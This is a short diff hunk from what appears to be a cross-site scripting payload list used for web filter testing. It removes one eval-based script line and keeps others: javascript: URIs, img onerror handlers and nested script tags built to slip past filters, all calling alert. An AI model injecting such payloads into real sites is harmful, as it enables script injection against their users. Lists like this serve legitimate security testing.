@@ -39,7 +39,6 @@ javascript:alert(1)
 element[attribute='<img src=x onerror=alert('XSS');>
 <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
-<script>for((i)in(self))eval(i)(1)</script>
 (alert)(1)
 <SCRIPT>(alert)(1)</SCRIPT>
 <img src=x onerror="(alert)(1)">
